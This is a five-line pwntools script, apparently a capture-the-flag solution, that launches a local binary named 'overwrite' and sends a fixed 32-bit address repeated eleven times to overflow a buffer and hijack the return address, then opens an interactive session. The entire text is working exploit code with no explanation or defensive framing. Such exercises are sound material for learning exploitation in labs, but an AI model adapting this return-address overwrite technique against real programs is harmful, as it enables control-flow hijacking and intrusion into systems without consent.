from pwn import *
io = process('./overwrite')
payload = p32(0x0804849B)*11
io.sendline(payload)
io.interactive()